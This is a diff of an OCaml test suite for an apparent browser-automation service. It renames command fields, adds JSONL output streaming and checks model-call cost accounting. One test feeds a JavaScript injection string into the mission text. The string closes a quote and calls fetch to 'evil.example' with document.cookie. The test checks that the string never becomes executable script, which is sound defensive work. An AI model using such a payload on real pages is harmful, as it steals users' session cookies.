@@ -168,9 +168,11 @@ let lifecycle () =
         (request tabs "bob"
            (P.Drive
               {
-                tab = h;
-                goal = "Do a task";
-                max_steps = None;
+                tab = Some h;
+                mission = "Do a task";
+                max_procedures = None;
+                expect = None;
+                out = None;
                 deadline_s = None;
                 dry_run = Some true;
               }));
@@ -392,7 +394,7 @@ let budget () =
   Alcotest.(check int)
     "run-obtt a run outlasts its deadline by the planner's correction call" 975_000
     (ms
-       (P.Run
+       (P.Drive
           {
             tab = Some handle;
             mission = "do the thing";
@@ -400,6 +402,7 @@ let budget () =
             deadline_s = Some 900;
             dry_run = None;
             expect = None;
+            out = None;
           }));
   Alcotest.(check int) "other commands keep one second" 1_000 (ms P.Status)
 
@@ -1039,9 +1042,11 @@ let drive_dry_run () =
             command =
               P.Drive
                 {
-                  tab = h;
-                  goal = "Open a result";
-                  max_steps = Some 3;
+                  tab = Some h;
+                  mission = "Open a result";
+                  max_procedures = Some 3;
+                  expect = None;
+                  out = None;
                   deadline_s = Some 30;
                   dry_run = Some true;
                 };
@@ -1061,7 +1066,7 @@ let drive_dry_run () =
       Alcotest.(check int) "drive-l7yk decision once" 1 !decisions;
       Alcotest.(check int)
         "drive-l7yk step once" 1
-        (match get "steps" reply with `List xs -> List.length xs | _ -> 0);
+        (match get "operator_steps" reply with `List xs -> List.length xs | _ -> 0);
       Alcotest.(check bool)
         "drive-l7yk no mutating browser operation" false
         (List.exists
@@ -1400,11 +1405,13 @@ let journal_redaction () =
             Resume { tab = missing };
             Drive
               {
-                tab = missing;
-                goal = "test";
-                max_steps = Some 1;
+                tab = Some missing;
+                mission = "test";
+                max_procedures = Some 1;
                 deadline_s = Some 1;
                 dry_run = Some true;
+                expect = None;
+                out = None;
               };
           ]
       in
@@ -1597,7 +1604,7 @@ let run_wire ?(who = "alice") ?expect ?tab mission =
     {
       owner = owner who;
       command =
-        P.Run
+        P.Drive
           {
             tab;
             mission;
@@ -1605,6 +1612,7 @@ let run_wire ?(who = "alice") ?expect ?tab mission =
             deadline_s = None;
             dry_run = None;
             expect;
+            out = None;
           };
     }
   |> Yojson.Safe.to_string
@@ -1703,15 +1711,76 @@ let run_mission () =
       let h = result (request tabs "alice" (P.New { url = Some product_url })) |> tab in
       let questions = ref [] in
       let answers = [ "automationexercise.com"; "add-to-cart"; "DONE" ] in
-      let levels = levels_with answers questions in
+      let base = levels_with answers questions in
+      let scored = ref 0 in
+      let levels =
+        Run.
+          {
+            base with
+            score =
+              (fun ~deadline ~sentence ~state ->
+                incr scored;
+                Leash__Model_usage.start "verifier";
+                let result = base.score ~deadline ~sentence ~state in
+                Leash__Model_usage.report "verifier" (Some 0.05);
+                result);
+            plan =
+              (fun ~deadline request ->
+                Leash__Model_usage.start "planner";
+                Leash__Model_usage.report "planner" (Some 0.3);
+                Leash__Model_usage.start "planner";
+                Leash__Model_usage.report "planner" (Some 0.07);
+                base.plan ~deadline request);
+          }
+      in
+      let decide ~deadline request =
+        Leash__Model_usage.start "operator";
+        let reply = decide_done ~deadline request in
+        Leash__Model_usage.report "operator" (Some 0.4);
+        reply
+      in
       let reply =
         with_ticking_clock env sw (fun () ->
             Leash.Control.handle ~model:"fixture-model" ~levels ~installed:[ playbook ]
-              ~decide:decide_done tabs
-              (run_wire ~tab:h ~expect:[ "the page is cart" ] "add Blue Top to the cart")
+              ~decide tabs
+              (run_wire ~tab:h
+                 ~expect:[ "checkout looks trustworthy"; "the page is cart" ]
+                 "add Blue Top to the cart")
             |> Yojson.Safe.from_string |> P.decode_reply)
       in
       let body = decoded reply in
+      let by_kind = get "model_calls_by_kind" (get "data" body) in
+      Alcotest.(check bool)
+        "extr-5x9e operator JEV calls counted" true
+        (match
+           List.assoc_opt "operator" (match by_kind with `Assoc xs -> xs | _ -> [])
+         with
+        | Some (`Int n) -> n > 0
+        | _ -> false);
+      Alcotest.(check bool)
+        "extr-5x9e each retry counted separately" true
+        (get "planner" by_kind = `Int 2);
+      Alcotest.(check bool)
+        ("extr-5x9e verifier calls counted " ^ string_of_int !scored)
+        true
+        (List.assoc_opt "verifier" (match by_kind with `Assoc xs -> xs | _ -> [])
+         = Some (`Int !scored)
+        && !scored > 0);
+      Alcotest.(check bool)
+        "extr-5x9e retry and verifier costs summed" true
+        (match get "model_cost" body with
+        | `Float n ->
+            Float.abs
+              (n
+              -. (0.37
+                 +. (float_of_int !scored *. 0.05)
+                 +. 0.4
+                    *.
+                    match get "operator" by_kind with
+                    | `Int n -> float_of_int n
+                    | _ -> 0.))
+            < 0.00001
+        | _ -> false);
       Alcotest.(check string)
         "run-4j1v the Added! modal is not DONE" "blocked"
         (match get "status" body with `String s -> s | _ -> "");
@@ -1725,7 +1794,7 @@ let run_mission () =
             (match get "outcome" entry with `String s -> s | _ -> "")
       | _ -> Alcotest.fail "run-9ypy the trace has no procedure");
       (match get "mission_expectations" body with
-      | `List [ expectation ] ->
+      | `List [ _; expectation ] ->
           Alcotest.(check bool)
             "run-4j1v the mission's own expectation was verified and did not hold" false
             (match get "passed" expectation with `Bool b -> b | _ -> true);
@@ -1841,7 +1910,7 @@ let run_refusals () =
       | P.Failure error -> Alcotest.fail error.P.message
       | P.Success body ->
           Alcotest.(check string)
-            "run-9ypy a mission with no tab still ends in a result" "blocked"
+            "extr-andy a mission with no playbook uses the operator" "done"
             (match get "status" body with `String s -> s | _ -> ""));
       let tabs_now =
         result (request tabs "alice" (P.List_tabs { all = false })) |> get "tabs"
@@ -1912,6 +1981,7 @@ let run_proposal () =
                     [ Goal Leash.Playbook.{ goal = "Look at the page."; hint = None } ];
                   expect = [ "the page is post-add" ];
                   expect_timeout_s = None;
+                  repeat = None;
                   max_steps = None;
                   deadline_s = None;
                 }
@@ -1986,6 +2056,7 @@ let discover_proposal () =
                 steps = [ Goal { goal = "Look at page"; hint = None } ];
                 expect = [ "the page is product" ];
                 expect_timeout_s = None;
+                repeat = None;
                 max_steps = None;
                 deadline_s = None;
               }
@@ -2549,7 +2620,7 @@ let playbook_check_command () =
    mission text, the argument the text helper fills — runs a script step. The page's engine
    is handed the playbook's script text exactly, with the hostile value only inside the
    JSON arguments; every other text it is handed is one the service itself owns. *)
-let run_scripts hostile =
+let run_scripts ?out hostile =
   with_books (fun book ->
       rig (fun env sw _ tabs fake ->
           let f = fake () in
@@ -2557,14 +2628,44 @@ let run_scripts hostile =
           let h =
             result (request tabs "alice" (P.New { url = Some product_url })) |> tab
           in
-          let levels = levels_with [ "books.example"; "collect"; "DONE" ] (ref []) in
+          let questions = ref [] in
+          let base = levels_with [ "books.example"; "collect"; "DONE" ] questions in
+          let levels =
+            Run.
+              {
+                base with
+                choose =
+                  (fun ~deadline question ->
+                    let kind =
+                      if question.Run.name = "select_playbook" then "playbook"
+                      else "procedure"
+                    in
+                    Leash__Model_usage.start kind;
+                    let answer = base.choose ~deadline question in
+                    Leash__Model_usage.report kind
+                      (Some (if kind = "playbook" then 0.1 else 0.2));
+                    answer);
+              }
+          in
           let text_helper () =
-            { Leash.Text_helper.complete = (fun ?deadline:_ _ -> Ok (Some hostile)) }
+            {
+              Leash.Text_helper.complete =
+                (fun ?deadline:_ _ ->
+                  Leash__Model_usage.start "text_helper";
+                  Leash__Model_usage.report "text_helper" None;
+                  Ok (Some hostile));
+            }
+          in
+          let decide ~deadline request =
+            Leash__Model_usage.start "operator";
+            let answer = decide_done ~deadline request in
+            Leash__Model_usage.report "operator" (Some 0.4);
+            answer
           in
           let reply =
             with_ticking_clock env sw (fun () ->
-                handle_with ~levels ~text_helper ~installed:[ book ] tabs "alice"
-                  (P.Run
+                handle_with ~levels ~text_helper ~decide ~installed:[ book ] tabs "alice"
+                  (P.Drive
                      {
                        tab = Some h;
                        mission = "collect the books " ^ hostile;
@@ -2572,13 +2673,69 @@ let run_scripts hostile =
                        deadline_s = None;
                        dry_run = None;
                        expect = None;
+                       out;
                      }))
           in
-          (result reply, payloads f, script_calls f)))
+          (result reply, payloads f, script_calls f, !questions)))
 
 let run_script_step () =
   let hostile = "'); fetch('https://evil.example/steal?c='+document.cookie); ('" in
-  let body, payloads_seen, calls = run_scripts hostile in
+  let body, payloads_seen, calls, model_requests = run_scripts hostile in
+  let billed = get "model_calls_by_kind" (get "data" body) in
+  Alcotest.(check int)
+    "extr-5x9e every actual model request" 4
+    (match get "model_calls" body with `Int n -> n | _ -> -1);
+  List.iter
+    (fun (kind, expected) ->
+      Alcotest.(check bool)
+        ("extr-5x9e " ^ kind ^ " call count")
+        true
+        (get kind billed = `Int expected))
+    [ ("playbook", 1); ("procedure", 2); ("text_helper", 1) ];
+  Alcotest.(check bool)
+    "extr-5x9e sum of reported costs" true
+    (match get "model_cost" body with
+    | `Float cost -> Float.abs (cost -. 0.5) < 0.00001
+    | _ -> false);
+  Alcotest.(check bool)
+    "extr-5x9e missing helper cost shown" true
+    (get "cost_unreported" (get "data" body) = `Int 1);
+  List.iter
+    (fun (question : Run.question) ->
+      let text = Yojson.Safe.to_string question.state in
+      Alcotest.(check bool)
+        "extr-b3u0 records never enter recorded model payloads" false
+        (contains text "A Light in the Attic" || contains text "Tipping the Velvet"))
+    model_requests;
+  let path = Filename.temp_file "leash-extr-b3u0" ".jsonl" in
+  Fun.protect
+    ~finally:(fun () -> Sys.remove path)
+    (fun () ->
+      let streamed, _, _, requests = run_scripts ~out:path "gpu" in
+      let input = open_in_bin path in
+      let rows =
+        Fun.protect
+          ~finally:(fun () -> close_in input)
+          (fun () ->
+            let rec lines acc =
+              match input_line input with
+              | line -> lines (Yojson.Safe.from_string line :: acc)
+              | exception End_of_file -> List.rev acc
+            in
+            lines [])
+      in
+      Alcotest.(check bool)
+        "extr-b3u0 streamed only validated records" true
+        (rows = match books_rows with `List rows -> rows | _ -> assert false);
+      Alcotest.(check bool)
+        "extr-b3u0 bounded reply count" true
+        (get "count" (get "data" streamed) = `Int 2);
+      List.iter
+        (fun (q : Run.question) ->
+          Alcotest.(check bool)
+            "extr-b3u0 JSONL records absent from every model request" false
+            (contains (Yojson.Safe.to_string q.state) "A Light in the Attic"))
+        requests);
   Alcotest.(check bool) "extr-8o1h the run is done" true (get "status" body = str "done");
   Alcotest.(check bool)
     "extr-8o1h the runner counts the records; no model sees them" true
@@ -2613,7 +2770,7 @@ let run_script_step () =
         (contains text "evil.example" || contains text "document.cookie"))
     payloads_seen;
   (* Everything else the engine was handed is what a run with a harmless mission hands it. *)
-  let _, baseline, _ = run_scripts "gpu" in
+  let _, baseline, _, _ = run_scripts "gpu" in
   let own text = not (String.starts_with ~prefix:"async function(args)" text) in
   let baseline = List.filter own baseline in
   List.iter
